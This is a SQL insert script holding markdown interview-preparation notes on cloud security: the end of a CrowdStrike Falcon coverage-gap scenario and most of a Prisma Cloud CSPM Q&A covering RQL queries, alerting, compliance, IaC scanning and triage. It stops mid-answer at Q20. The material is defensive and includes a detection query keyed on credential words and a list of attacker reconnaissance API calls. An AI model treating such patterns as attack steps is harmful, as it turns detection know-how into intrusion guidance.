- **Coverage Dashboard:** Container coverage dropped from 100% to 85%
- **AWS API vs Falcon API Reconciliation:** 3 EC2 instances have no corresponding Falcon sensor
- **DaemonSet Status:** `kubectl get ds -n falcon-system` shows `DESIRED: 10, CURRENT: 7`

**Investigation:**
1. Why aren't the sensors scheduled? Check for **taints** on the new nodes and **tolerations** in the DaemonSet spec
2. Are there node selectors or affinity rules that exclude the new nodes?
3. Is there a resource constraint preventing the sensor pod from scheduling?

**Risk:** High — unmonitored nodes are blind spots. Any attack on these nodes will not generate Falcon alerts.

**Remediation:** Add the appropriate tolerations to the Falcon DaemonSet, set up automated coverage reconciliation (Lambda comparing EC2 API ↔ Falcon API daily), alert on coverage drops.

**Interview Answer:**
> "Coverage gaps are a governance risk. An attacker will target the node without sensors. I reconcile coverage daily by comparing the AWS EC2 API (list of all EKS nodes) against the Falcon Hosts API (list of reporting sensors). Any mismatch triggers a PagerDuty alert. The most common cause is taint/toleration mismatch when new node groups are added — I ensure the Falcon DaemonSet tolerates all common EKS taints."

---

> [!TIP]
> **Interview Day Tip:** When answering runtime detection scenarios, always follow this structure:
> 1. **"First, I look at..."** — identify the detection signal
> 2. **"Then I check..."** — describe the investigation
> 3. **"My immediate action is..."** — containment
> 4. **"To prevent this in the future..."** — remediation and prevention
> 
> This shows methodical thinking and operational maturity.$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Prisma_Cloud_CSPM_Interview_QA$VELSEC$, $VELSEC$Prisma Cloud Cspm Interview Qa$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# Prisma Cloud CSPM — Interview Questions & Answers

**Comprehensive CSPM / CNAPP Interview Preparation**
Prepared: March 2026

---

# SECTION 1: PRISMA CLOUD PLATFORM FUNDAMENTALS

---

### Q1. What is Prisma Cloud and what are its core capabilities?

**Answer:**
Prisma Cloud by Palo Alto Networks is a comprehensive Cloud-Native Application Protection Platform (CNAPP) that provides full lifecycle security — from code to cloud — across multi-cloud and hybrid environments.

**Core Capabilities:**

| Module | Description |
|---|---|
| **CSPM** (Cloud Security Posture Management) | Continuous monitoring of cloud configurations against security benchmarks and compliance frameworks |
| **CWPP** (Cloud Workload Protection Platform) | Runtime protection for VMs, containers, serverless, and web applications (formerly Twistlock) |
| **CIEM** (Cloud Infrastructure Entitlement Management) | IAM security — effective permissions analysis, excessive privilege detection, identity governance |
| **DSPM** (Data Security Posture Management) | Sensitive data discovery and classification across cloud data stores |
| **Code Security** | IaC scanning (built on Checkov), SCA, secrets detection, CI/CD pipeline security |
| **Cloud Network Security** | Microsegmentation, network visualization, and network-level threat detection |
| **AI Security** | Prisma Cloud AI-SPM for discovering and securing AI workloads |
| **Prisma Cloud Copilot** | AI-powered assistant using Precision AI® for natural language queries, investigation, and remediation guidance |

**Prisma Cloud Architecture:**
- **SaaS-delivered** management console (app.prismacloud.io)
- **Agentless scanning** for CSPM and some CWPP capabilities
- **Agent-based (Defender)** for comprehensive runtime protection (CWPP)
- **API-based** cloud account onboarding via read-only service principals / cross-account roles
- **Checkov** open-source engine for IaC scanning

**Key differentiator:**
Prisma Cloud's strength lies in its **breadth of coverage** — it's one of the most comprehensive CNAPPs covering code, build, deploy, and run phases with a single platform. The Palo Alto Networks ecosystem integration (Cortex XSIAM, XSOAR, Strata firewalls) provides a unified security operations experience.

---

### Q2. Explain Prisma Cloud's CSPM architecture. How does it connect to cloud accounts?

**Answer:**
Prisma Cloud CSPM connects to cloud providers through **Cloud Account onboarding**, which involves creating a service principal (Azure), cross-account role (AWS), or service account (GCP) with read-only permissions.

**AWS Onboarding:**
1. Prisma Cloud provides a CloudFormation template
2. Template creates an IAM role with the `SecurityAudit` managed policy and Prisma Cloud-specific permissions
3. The role's trust policy allows Prisma Cloud's external AWS account to assume it with an External ID
4. Prisma Cloud assumes this role every 4-24 hours (configurable) to scan the account

**Azure Onboarding:**
1. Register Prisma Cloud as an application in Azure AD
2. Create a custom role with read-only permissions across subscriptions
3. Prisma Cloud uses the app registration credentials to query Azure APIs

**GCP Onboarding:**
1. Create a service account with Viewer role and Organization-level access
2. Enable required GCP APIs
3. Prisma Cloud uses the service account key to access GCP APIs

**Data Flow:**
```
Cloud Provider APIs → Prisma Cloud Ingestion Engine → Configuration Database → 
RQL Query Engine → Policy Evaluation → Alert Generation → Notification Channels
```

**Ingestion Frequency:**
- Default: Every 4 hours for full configuration scan
- Near real-time: For specific high-priority services using event-driven ingestion (CloudTrail integration)
- Custom: Configurable scan intervals per account group

---

### Q3. What is RQL (Resource Query Language) in Prisma Cloud? Why is it important?

**Answer:**
RQL is Prisma Cloud's proprietary query language for investigating and analyzing cloud resource configurations, network flows, and events. It is the **backbone** of all Prisma Cloud CSPM operations.

**Three Types of RQL Queries:**

**1. Config Queries:**
Query the configuration state of cloud resources.
```
config from cloud.resource where api.name = 'aws-s3api-get-bucket-acl' 
AND json.rule = acl.grants[?(@.permission=='FULL_CONTROL' && @.grantee=='AllUsers')]
```
This finds all S3 buckets with full public access.

**2. Network Queries:**
Query network flow data to understand actual traffic patterns.
```
network from vpc.flow_record where 
source.publicnetwork IN ('Internet IPs', 'Suspicious IPs') AND 
dest.resource IN (resource where role IN ('AWS RDS'))
```
This identifies internet traffic reaching RDS databases.

**3. Event Queries:**
Query cloud audit events to investigate actions taken.
```
event from cloud.audit_logs where 
operation = 'SetDefaultPolicyVersion' AND 
user = 'arn:aws:iam::123456789012:user/suspicious-user'
```
This finds IAM policy version changes by a specific user.

**Why RQL is critical for interviews:**
- Every custom policy in Prisma Cloud is written in RQL
- Investigation workflows rely on RQL queries
- Demonstrating RQL proficiency shows hands-on Prisma Cloud experience
- It's the equivalent of knowing KQL for Sentinel or SPL for Splunk

**Common RQL Patterns to Know:**

| Pattern | RQL Example |
|---|---|
| Find unencrypted resources | `config from cloud.resource where api.name = 'aws-rds-describe-db-instances' AND json.rule = storageEncrypted is false` |
| Find public security groups | `config from cloud.resource where api.name = 'aws-ec2-describe-security-groups' AND json.rule = ipPermissions[*].ipRanges[*] contains 0.0.0.0/0` |
| Find IAM users with console access but no MFA | `config from cloud.resource where api.name = 'aws-iam-get-credential-report' AND json.rule = mfa_active is false AND password_enabled is true` |
| Find inactive access keys | `config from cloud.resource where api.name = 'aws-iam-get-credential-report' AND json.rule = access_key_1_last_used_date older_than 90` |

---

### Q4. Explain the policy framework in Prisma Cloud. What are the different policy types?

**Answer:**
Prisma Cloud policies are the security rules that evaluate cloud configurations and generate alerts when violations are found.

**Policy Types:**

| Policy Type | Description | Example |
|---|---|---|
| **Config** | Evaluates cloud resource configurations at a point in time | "S3 bucket does not have server-side encryption enabled" |
| **Network** | Analyzes network flow data for suspicious traffic patterns | "Database instance receives direct internet traffic" |
| **Audit Event** | Monitors cloud audit logs for high-risk actions | "Root account used for API calls" |
| **IAM** | Evaluates identity and access management configurations | "IAM group with admin privileges has inactive users" |
| **Data** | Monitors for exposed sensitive data | "S3 bucket with PII data has public access" |
| **Anomaly** | Uses ML to detect unusual behavior patterns | "Unusual API activity from an IAM user" |
| **Attack Path** | Identifies chains of vulnerabilities leading to high-value targets | "Internet-facing VM with Critical CVE can access database with PII" |

**Policy Severity Levels:**
- **Critical** — Immediate remediation required (e.g., public database with PII)
- **High** — Remediate within 48 hours (e.g., unrestricted security group on production)
- **Medium** — Remediate within 7 days (e.g., missing encryption at rest)
- **Low** — Informational, track in governance (e.g., resource without required tags)
- **Informational** — No action required, used for visibility

**Policy Modes:**
- **Default Policies:** Pre-built by Palo Alto Networks security research team, mapped to compliance frameworks
- **Custom Policies:** Written by the customer using RQL to address organization-specific requirements
- **System Policies:** Prisma-managed, cannot be modified (but can be enabled/disabled)

**Policy-to-Compliance Mapping:**
Each policy can be mapped to one or more compliance standards:
- A single policy like "Ensure encryption at rest is enabled for RDS" maps to:
  - CIS AWS 2.3.1
  - PCI DSS 3.4
  - HIPAA 164.312(a)(1)
  - NIST 800-53 SC-28

---

### Q5. Describe the alert lifecycle in Prisma Cloud. How are alerts generated, managed, and resolved?

**Answer:**

**Alert Generation Flow:**
```
Cloud Account Scan → Resource Configuration Ingested → 
RQL Policy Evaluated → Violation Detected → Alert Created → 
Notification Sent (Slack/Jira/Email/SIEM/ServiceNow)
```

**Alert States:**

| State | Description |
|---|---|
| **Open** | Policy violation detected and active — resource is currently non-compliant |
| **Resolved** | Resource configuration has been fixed to comply with the policy |
| **Dismissed** | Manually dismissed by an analyst with a reason (accepted risk, false positive, etc.) |
| **Snoozed** | Temporarily hidden for a defined period (e.g., remediation in progress) |

**Alert Rules:**
Alert Rules define which policies generate notifications and where they are sent:

```
Alert Rule = Account Groups + Policies + Notification Channels + Severity Threshold
```

Example:
- **Production Alert Rule:** All Critical & High policies → PagerDuty + Jira (auto-ticket) + Slack #security-alerts
- **Development Alert Rule:** Critical only → Jira (auto-ticket) + Slack #dev-security
- **Compliance Alert Rule:** All PCI DSS policies → ServiceNow + Email compliance-team

**Auto-Remediation:**
Prisma Cloud supports automated remediation for certain policies:
- Remediation is executed via cloud-native actions (e.g., aws cli commands, Azure PowerShell)
- Must be explicitly enabled per policy — never enable without testing in non-production
- Example: Auto-enable S3 encryption when an unencrypted bucket is detected

**Alert Investigation Workflow:**
1. Alert fires → Analyst clicks to view the resource in Prisma Cloud
2. **Resource Detail View:** Shows the actual JSON configuration of the violating resource
3. **RQL Investigation:** Analyst runs additional RQL queries to understand context
4. **Graph View:** Shows the resource's relationships to other resources (identity, network, data)
5. **Remediation:** Analyst follows the guided remediation steps or runs auto-remediation
6. **Verification:** Next scan cycle confirms the fix and auto-resolves the alert

---

### Q6. What compliance frameworks does Prisma Cloud support? How do you use compliance in practice?

**Answer:**
Prisma Cloud supports 100+ compliance frameworks out-of-the-box:

**Major Frameworks:**
- CIS Benchmarks (AWS, Azure, GCP, Kubernetes, Docker)
- NIST SP 800-53 (Rev 4 & 5)
- NIST CSF (Cybersecurity Framework)
- PCI DSS v4.0
- SOC 2 Type II
- HIPAA / HITECH
- GDPR
- ISO 27001 / 27017 / 27018
- FedRAMP High / Moderate / Low
- MITRE ATT&CK Cloud Matrix
- CSA CCM (Cloud Controls Matrix)
- AWS Well-Architected Framework (Security Pillar)
- APRA CPS 234 (Australian banking)
- MAS TRM (Singapore banking)
- RBI Guidelines (India banking)
- Custom organizational frameworks

**How Compliance Works in Practice:**

**1. Framework Activation:**
- Enable the required compliance framework in Prisma Cloud Settings
- Prisma Cloud automatically maps its policies to the framework's controls

**2. Compliance Dashboard:**
- Shows pass/fail percentage per framework
- Drill down by: Section, Requirement, Control, Individual Policy
- Filter by: Cloud account, region, resource type, business unit

**3. Compliance Reports:**
- **One-click export** to PDF/CSV suitable for auditors
- Shows: Control description, policy status, failing resources, evidence timestamps
- Scheduled reports: Auto-generate and email weekly/monthly compliance reports

**4. Custom Compliance Standards:**
- Create custom standards by mapping a selection of Prisma Cloud policies
- Useful for internal security standards that don't align exactly with public frameworks

**Compliance Workflow for Audit Prep:**
```
Enable Framework → Review Dashboard → Identify Failing Controls → 
Create Remediation Tickets → Track Progress → Generate Report → 
Present to Auditor
```

---

# SECTION 2: PRISMA CLOUD CSPM DEEP DIVE

---

### Q7. How does Prisma Cloud handle multi-cloud environments?

**Answer:**
Prisma Cloud supports 7+ cloud providers with unified policy enforcement:

**Supported Clouds:**
- AWS (most comprehensive coverage)
- Microsoft Azure
- Google Cloud Platform (GCP)
- Oracle Cloud Infrastructure (OCI)
- Alibaba Cloud
- IBM Cloud

**Multi-Cloud Policy Enforcement:**
Prisma Cloud uses a **normalized data model** that allows a single policy to evaluate resources across clouds:

| Concept | AWS | Azure | GCP |
|---|---|---|---|
| Object Storage | S3 | Blob Storage | Cloud Storage |
| Compute | EC2 | Virtual Machines | Compute Engine |
| IAM Role | IAM Role | Managed Identity | Service Account |
| VPC | VPC | VNet | VPC |
| Kubernetes | EKS | AKS | GKE |

**Unified Asset Inventory:**
The Asset Inventory in Prisma Cloud provides a single view of all resources across all clouds:
- Total resource count by cloud, type, region
- Compliance status per resource
- Tag-based filtering and grouping
- Historical change tracking

**Account Groups:**
Resources are organized into **Account Groups** that support multi-cloud organizational structures:
```
Account Group: Production
├── AWS Account: prod-main (123456789012)
├── AWS Account: prod-data (234567890123)
├── Azure Subscription: Production-Sub
└── GCP Project: prod-gcp-1
```

Alert rules, compliance requirements, and access controls are applied at the Account Group level.

---

### Q8. Explain Asset Inventory in Prisma Cloud. How do you use it effectively?

**Answer:**
The Asset Inventory is the centralized resource database in Prisma Cloud that tracks every cloud resource across all onboarded accounts.

**What it shows:**
- **Total Resources:** Count by cloud provider, service, region
- **Resource Details:** Full JSON configuration of each resource (same data you'd see in the cloud provider console)
- **Pass/Fail Status:** How many policies each resource passes/fails
- **Compliance Mapping:** Which compliance standards the resource is relevant to
- **Change History:** Configuration changes over time (when it was compliant vs non-compliant)
- **Relationships:** Connected resources (e.g., EC2 → Security Group → VPC → Subnet)

**How I use Asset Inventory:**

**1. Shadow IT Discovery:**
```
config from cloud.resource where cloud.type = 'aws' AND api.name = 'aws-ec2-describe-instances' 
AND tag.Name does not exist
```
This finds all EC2 instances without a Name tag — likely unmanaged resources.

**2. Blast Radius Assessment:**
During an incident, query the asset inventory to understand what else is in the same environment:
```
config from cloud.resource where cloud.account = 'prod-main' AND 
cloud.region = 'us-east-1' AND api.name = 'aws-rds-describe-db-instances'
```
This lists all RDS databases in the affected account/region.

**3. Compliance Tracking:**
Filter the inventory by a specific compliance standard to see which resources are non-compliant:
- "Show me all resources failing PCI DSS controls in the payments account group"
- Export to CSV for the audit team

**4. Configuration Drift:**
Track changes over time — if a resource was compliant on Monday but non-compliant on Wednesday, the Asset Inventory shows the configuration diff.

---

### Q9. How do you create custom policies in Prisma Cloud? Walk through an example.

**Answer:**

**Step-by-Step Process:**

**1. Define the Requirement:**
"Alert if any AWS Lambda function has environment variables containing strings that look like credentials (containing 'password', 'secret', 'key', or 'token')."

**2. Build the RQL Query:**
```
config from cloud.resource where 
api.name = 'aws-lambda-list-functions' AND 
json.rule = environment.variables[*] contains "password" or 
environment.variables[*] contains "secret" or 
environment.variables[*] contains "key" or 
environment.variables[*] contains "token"
```

**3. Test the Query in Prisma Cloud Investigate:**
- Go to **Investigate** tab
- Paste the RQL query
- Review results — confirm it catches real violations and doesn't produce excessive false positives
- Refine the query based on results

**4. Create the Custom Policy:**
- Go to **Policies** → **Add Policy**
- **Policy Name:** "Lambda function with credentials in environment variables"
- **Policy Type:** Config
- **Severity:** High
- **Description:** "Lambda functions should not store sensitive credentials as environment variables. Use AWS Secrets Manager or SSM Parameter Store instead."
- **RQL Query:** Paste the tested query
- **Compliance Mapping:** Map to relevant standards (CIS, NIST)
- **Remediation:** "Remove credentials from Lambda environment variables. Store sensitive values in AWS Secrets Manager and reference via the SDK."

**5. Assign to Alert Rules:**
- Add the policy to relevant Alert Rules so it generates notifications
- Test in a dev account before enabling for production

**6. Validate:**
- Verify alerts are firing for known violations
- Confirm no false positives
- Document the policy for the security team

---

### Q10. Compare Prisma Cloud's approach to alerts vs. Wiz's approach. What are the key differences?

**Answer:**

| Aspect | Prisma Cloud | Wiz |
|---|---|---|
| **Primary Unit** | Individual policy-level alerts (one alert per failing resource per policy) | Attack paths + Issues (contextual grouping of related findings) |
| **Alert Volume** | Can be very high — thousands of individual alerts across hundreds of policies | Lower effective volume — focuses on attack paths rather than individual findings |
| **Prioritization** | Policy-defined severity (Critical/High/Medium/Low) — static per policy | Dynamic severity based on Security Graph context — same finding gets different severity based on exposure, identity, and data context |
| **Investigation** | RQL-driven — analyst writes queries to understand context | Graph-driven — analyst visualizes relationships in the Security Graph |
| **Strengths** | Deep RQL capability for custom investigation, granular policy control, extensive cloud API coverage | Superior contextual risk prioritization, attack path visualization, intuitive UX |
| **Weaknesses** | Can produce alert fatigue without careful tuning; less contextual correlation out-of-the-box | Less granular RQL-level control for power users; newer platform with some feature gaps |
| **Best For** | Organizations that want deep customization and integration with Palo Alto ecosystem | Organizations that want contextual risk prioritization and fast time-to-value |

**Interview Talking Point:**
"Both tools are strong CSPM platforms. My approach is to use each tool's strength: Prisma Cloud's RQL gives me deep investigative querying power and its ecosystem integration with Cortex XSIAM/XSOAR provides a unified SOC workflow. Wiz's Security Graph gives me immediate visibility into which risks actually form exploitable attack paths. In an ideal architecture, you'd use the contextual risk prioritization to decide what to fix first, and the deep querying capability to investigate and validate."

---

# SECTION 3: PRISMA CLOUD ADMINISTRATION & OPERATIONS

---

### Q11. Describe the role-based access control (RBAC) model in Prisma Cloud.

**Answer:**
Prisma Cloud uses a granular RBAC model with three key components:

**1. Roles:**

| Role | Permissions |
|---|---|
| **System Admin** | Full access to all features, settings, and accounts |
| **Account Group Admin** | Full access scoped to specific Account Groups |
| **Account Group Read Only** | Read-only access to specific Account Groups |
| **Cloud Provisioning Admin** | Manage cloud account onboarding and settings |
| **Build and Deploy Security** | Access to Code Security and CI/CD features |
| **Compute Admin** | Full access to CWPP (Compute) features |
| **Custom Roles** | Organization-defined roles with granular permission selection |

**2. Account Groups:**
Control which cloud accounts a user can see and manage:
- A user assigned to "Production" Account Group only sees resources from production accounts
- This enforces line-of-business or environment-level access segregation

**3. Access Keys:**
For API access and automation:
- Generate access keys per user for programmatic Prisma Cloud API calls
- Keys inherit the permissions of the user who created them
- Keys should be rotated every 90 days

**RBAC Best Practices:**
- Map RBAC roles to AD/Okta groups via SSO integration
- Use Account Group-scoped roles to enforce least privilege
- Never share System Admin credentials across team members
- Audit user access quarterly

---

### Q12. How do you integrate Prisma Cloud with external tools and workflows?

**Answer:**

**1. SIEM Integration:**
- **Splunk:** Native app (Prisma Cloud App for Splunk) sends alerts as syslog/webhook
- **Sentinel (Azure):** Direct integration via Data Connectors
- **QRadar:** Webhook-based alert forwarding
- **Cortex XSIAM:** Native Palo Alto integration for unified SOC operations

**2. Ticketing & ITSM:**
- **Jira:** Auto-create tickets from Prisma Cloud alerts, with resource details and remediation steps
- **ServiceNow:** Incident creation with policy mapping and compliance context
- **PagerDuty:** Alert routing based on severity for on-call engineers

**3. Notification Channels:**
- **Slack / Microsoft Teams:** Channel notifications for Critical/High alerts
- **Email:** For compliance reports and summary digests
- **Webhooks:** Custom integration with any tool that accepts HTTP webhooks

**4. CI/CD Integration:**
- **GitHub / GitLab / Bitbucket:** IaC scanning in PRs via Checkov or Prisma Cloud Code Security
- **Jenkins:** Plugin for pipeline-integrated scanning
- **Terraform Cloud / Enterprise:** Pre-plan scanning via Sentinel policies
- **IDE Plugins:** VS Code extension for real-time IaC feedback

**5. Automation & Orchestration:**
- **Cortex XSOAR:** Prisma Cloud content pack for automated incident response playbooks
- **Prisma Cloud API:** REST API for programmatic access to all Prisma features
- **Terraform Provider:** Manage Prisma Cloud policies and settings as code

**Example Integration Architecture:**
```
Prisma Cloud Alert (Critical) 
  → PagerDuty (immediate notification)
  → Jira (auto-create ticket)
  → Slack #security-critical (visibility)
  → XSOAR Playbook (automated investigation + containment)
```

---

### Q13. How do you manage alert fatigue in Prisma Cloud?

**Answer:**

**1. Alert Rule Optimization:**
- Create separate Alert Rules per environment (Production, Staging, Dev)
- Production: All severities → PagerDuty + Jira
- Development: Critical only → Slack + Jira
- Sandbox: Disabled — use Compliance dashboard only

**2. Policy Tuning:**
- Review each enabled policy for relevance to the organization
- Disable policies that don't apply (e.g., disable GovCloud-specific policies if not using GovCloud)
- Adjust severity levels if the default doesn't match organizational risk appetite
- Use RQL to refine policies (e.g., exclude specific resource tags from alerting)

**3. Alert Grouping & Aggregation:**
- Use Alert Rule filters to group related alerts
- Configure digest notifications instead of real-time for Medium/Low findings
- Leverage the Compliance dashboard for bulk tracking rather than individual alerts

**4. Dismissal & Snooze Governance:**
- **Dismiss:** Only with documented reason (Accepted Risk, False Positive, Compensating Control)
- **Snooze:** For known remediation in progress — set to auto-reopen after snooze period
- **Never** permanently dismiss without exception process approval

**5. Metrics Tracking:**
- Monitor: Alert volume trends, resolution time, dismiss rate, top noisy policies
- Monthly review: Which policies generate the most alerts? Are they actionable?
- Quarterly: Review dismissed/snoozed alerts — are they still valid?

**6. Anomaly Policy Tuning:**
- Anomaly-based policies (ML-driven) require baseline training
- Allow 2-4 weeks for the baseline to stabilize before enforcing alerts
- Whitelist known automation patterns (CI/CD service accounts, etc.)

---

### Q14. How does Prisma Cloud handle IaC scanning (Infrastructure as Code)?

**Answer:**
Prisma Cloud Code Security (formerly Bridgecrew) provides IaC scanning built on the open-source **Checkov** engine.

**Supported IaC Frameworks:**
- Terraform (HCL & JSON)
- CloudFormation (YAML & JSON)
- Kubernetes manifests (YAML)
- Helm charts
- Dockerfile
- ARM Templates (Azure)
- Serverless Framework
- Bicep
- CDK (synthesized)
- Ansible

**How IaC Scanning Works:**

**1. CI/CD Integration:**
```yaml
# GitHub Actions Example
- name: Prisma Cloud IaC Scan
  uses: bridgecrewio/checkov-action@master
  with:
    api-key: ${{ secrets.PRISMA_API_KEY }}
    directory: './terraform'
    framework: terraform
    soft_fail: false  # fail the pipeline on violations
```

**2. Pre-Commit Hooks:**
Developers run Checkov locally before pushing code:
```bash
checkov -d ./terraform --bc-api-key $PRISMA_API_KEY
```

**3. VCS Integration:**
- Connect GitHub/GitLab/Bitbucket repositories directly to Prisma Cloud
- Automatic PR scanning — comments on PRs with violations
- Tracks drift between IaC definitions and runtime configurations

**4. Supply Chain Security:**
- Visualizes dependency chains in IaC modules
- Detects vulnerable third-party Terraform modules
- Identifies hard-coded secrets in IaC files

**Shift-Left Value:**
"Catching a security group misconfiguration in Terraform during a PR review costs $0 and takes 5 minutes. Catching the same misconfiguration in production after it's been exploited costs millions. IaC scanning is the highest-ROI security investment for cloud-native organizations."

---

### Q15. Explain how Prisma Cloud CIEM works and its relationship with CSPM.

**Answer:**

**Prisma Cloud CIEM Capabilities:**

**1. Net Effective Permissions:**
Prisma Cloud calculates the actual permissions an identity has by evaluating:
- Identity policies (managed + inline)
- Resource-based policies
- Permission boundaries
- SCPs (Organizations)
- Session policies

**2. Overly Permissive Access Detection:**
RQL query example:
```
config from iam where action.name = '*' AND 
dest.cloud.resource.name = '*' AND 
source.cloud.service.name = 'iam'
```
This finds identities with wildcard permissions on all resources — admin-level access.

**3. Unused Access Detection:**
By correlating granted permissions with CloudTrail event data:
- Identifies permissions granted but never used in the last 90 days
- Recommends right-sized policies based on actual usage

**4. Cross-Account Access Mapping:**
Visualizes all cross-account trust relationships:
- Which roles can be assumed from other accounts?
- Are trust policies using External IDs?
- Are there orphaned cross-account trusts?

**5. Service Account Risk:**
- Identifies service accounts with console access enabled
- Detects access keys that haven't been rotated
- Flags service accounts with admin-level permissions

**Relationship with CSPM:**
CIEM findings feed into the CSPM risk model:
- A misconfigured Security Group (CSPM finding) on a VM with an overly-permissive IAM role (CIEM finding) accessing sensitive data (DSPM finding) creates a **compound risk** that is higher than any individual finding
- This correlation is what makes a CNAPP platform more valuable than point solutions

---

# SECTION 4: SCENARIO-BASED QUESTIONS

---

### Q16. Scenario: You receive 500 new Prisma Cloud alerts after onboarding a new AWS account. How do you triage?

**Answer:**

**Step 1: Don't Panic — Categorize (First 30 minutes)**
1. Open the Prisma Cloud Alerts page and filter by the new account
2. Group by severity: Critical → High → Medium → Low
3. Group by policy type: What categories dominate? (e.g., 200 are network-related, 150 are IAM, etc.)

**Step 2: Critical Alerts First (First 2 hours)**
4. Review all Critical alerts individually — these represent immediate risk:
   - Public-facing databases
   - Admin-level IAM with no MFA
   - S3 buckets with public access containing sensitive data
5. For each Critical, determine: Is this a real risk or a known-accepted configuration?
6. Create incident tickets for genuine Critical risks with remediation deadlines

**Step 3: Pattern Analysis (Day 1)**
7. Look for patterns — are 200 alerts caused by the same misconfiguration applied to 200 resources?
   - Example: All 200 EC2 instances missing a required tag → single remediation action (Terraform update)
8. Identify the "noisy" policies — if a policy generates 100+ alerts, investigate:
   - Is the policy relevant to this account type?
   - Should this account be in a different Account Group with different policies?

**Step 4: Establish Baseline (Week 1)**
9. Work with the account owner to understand intended configurations
10. Dismiss or snooze known-accepted configurations with documentation
11. Create remediation tickets for genuine violations with SLA-based deadlines
12. Configure Alert Rules appropriate for this account's tier (prod vs dev)

**Step 5: Ongoing Governance**
13. After initial triage, track: How many new alerts per day? What's the resolution rate?
14. Goal: Reduce open alerts by 80% in the first 30 days through remediation + appropriate tuning

---

### Q17. Scenario: An auditor asks you to prove PCI DSS compliance across your AWS environment using Prisma Cloud. Walk through your approach.

**Answer:**

**Phase 1: Scope Definition**
1. Identify the AWS accounts and services in PCI scope (cardholder data environment)
2. Create a dedicated Account Group in Prisma Cloud: "PCI Scope"
3. Onboard all in-scope accounts to this Account Group

**Phase 2: Compliance Assessment**
4. Go to **Compliance** → Select **PCI DSS v4.0**
5. Review the overall compliance percentage: "Currently 78% compliant"
6. Drill down by requirement:
   - Requirement 1 (Network Security Controls): 90% compliant
   - Requirement 3 (Protect Stored Account Data): 65% compliant — needs work
   - Requirement 6 (Secure Development): 72% compliant
   - Requirement 8 (Strong Access Controls): 55% compliant — critical gap

**Phase 3: Evidence Collection**
7. For each passing control, export the evidence:
   - "Encryption at rest is enabled on all RDS instances in PCI scope — confirmed by Prisma Cloud policy XYZ, last validated [timestamp]"
8. For each failing control, document:
   - What's failing (specific resources)
   - Remediation plan with timeline
   - Compensating controls (if applicable)

**Phase 4: Remediation**
9. Prioritize by requirement criticality:
   - Requirement 8 (IAM) — 55% → Focus remediation effort here
   - Create Jira tickets for each failing policy
10. Track remediation progress in the Compliance dashboard

**Phase 5: Audit Presentation**
11. Generate the **Prisma Cloud PCI DSS Compliance Report** (one-click PDF)
12. Walk the auditor through:
    - How Prisma Cloud continuously monitors the environment (not point-in-time)
    - How policies map to PCI requirements
    - Evidence of continuous compliance for passing controls
    - Remediation plans and timelines for failing controls

**Key Evidence Artifacts:**
- Compliance dashboard screenshots showing control pass/fail status
- Policy details showing the RQL query that validates each control
- Alert history showing when failures were detected and resolved
- Change history showing resource configurations over time

---

### Q18. Scenario: A developer complains that Prisma Cloud is blocking their Terraform deployment in CI/CD. How do you handle it?

**Answer:**

**Step 1: Understand the Block (Immediate)**
1. Review the CI/CD pipeline logs to identify which Prisma Cloud / Checkov policy caused the failure
2. Example: Policy "Ensure Security Group does not allow ingress from 0.0.0.0/0 to port 22" blocked the deployment

**Step 2: Assess the Finding (15 minutes)**
3. Is this a legitimate security concern?
   - **Yes:** The Terraform is creating an SSH-open security group for a production application → this should be blocked
   - **Maybe:** It's a bastion host that legitimately needs SSH access from specific IPs → the Terraform should be refined
   - **No:** It's a false positive caused by a policy that's too broad → the policy needs tuning

**Step 3: Respond Appropriately**

**If the block is correct:**
4. Explain to the developer why this configuration is risky
5. Provide the correct Terraform configuration:
   ```hcl
   # Instead of:
   ingress {
     from_port   = 22
     to_port     = 22
     cidr_blocks = ["0.0.0.0/0"]  # BLOCKED by Prisma Cloud
   }
   
   # Use:
   ingress {
     from_port   = 22
     to_port     = 22
     cidr_blocks = ["10.0.0.0/8"]  # Corporate CIDR only
   }
   ```

**If an exception is needed:**
5. Document the business justification
6. Add a Checkov skip annotation to the specific resource (not globally):
   ```hcl
   resource "aws_security_group" "bastion" {
     #checkov:skip=CKV_AWS_24:Bastion host requires SSH from approved IPs, approved by security team JIRA-1234
   }
   ```
7. The skip annotation is version-controlled and auditable

**If the policy needs tuning:**
5. Refine the policy to exclude specific resource types or tags:
   ```
   config from cloud.resource where api.name = 'aws-ec2-describe-security-groups' 
   AND json.rule = ipPermissions[*].ipRanges[*] contains 0.0.0.0/0 
   AND tag.exception_approved does not exist
   ```

**Key Principle:**
"I never disable a policy globally to unblock one developer. Instead, I provide the correct configuration, or if an exception is truly needed, it's documented, scoped, and auditable."

---

### Q19. Scenario: You notice that Prisma Cloud shows a spike in anomaly alerts — 50 new "Unusual API Activity" alerts in the last 24 hours. How do you investigate?

**Answer:**

**Step 1: Pattern Recognition (First 15 minutes)**
1. Review all 50 alerts — look for commonalities:
   - Are they all from the same AWS account?
   - Are they all from the same IAM principal?
   - Are they all happening in the same time window?
   - Are the API calls similar (all IAM calls? all S3 calls?)

**Step 2: Classify the Spike**

**If all from one principal making unusual calls:**
- Possible compromised credentials
- Query CloudTrail via RQL:
  ```
  event from cloud.audit_logs where cloud.account = 'prod-main' AND 
  user = 'arn:aws:iam::123456789012:user/deploy-bot' AND 
  crud IN ('create', 'update', 'delete')
  ```
- Check: Source IP, user agent, time of day
- Compare against the principal's baseline behavior

**If from many principals — pattern change:**
- Possible organizational change (new deployment pipeline, new team, new tool)
- Check with DevOps: "Did anything change in the last 24-48 hours?"
- Common causes: New CI/CD tool adopted, new team members onboarded, infrastructure migration

**Step 3: Determine if Malicious**
2. Red flags for compromised credentials:
   - API calls from unusual geographic locations
   - reconnaissance-pattern calls: ListUsers, ListBuckets, DescribeInstances
   - Calls from unexpected user agents (aws-cli when expecting SDK)
   - IAM modifications: CreateUser, PutRolePolicy, CreateAccessKey

3. If confirmed malicious:
   - Trigger IR playbook
   - Revoke the compromised credentials
   - Rotate all credentials the principal could access
   - Review CloudTrail for full scope of compromise

**Step 4: Resolution**
4. If benign: Whitelist the new pattern in anomaly policy configuration
5. If malicious: Complete incident response and tighten IAM policies to prevent recurrence

---

### Q20. Scenario: You need to set up Prisma Cloud for a new organization with 50 AWS accounts across 3 business units. Describe your approach.

**Answer:**

**Phase 1: Architecture Design (Week 1)**

**Account Group Structure:**
```
Root
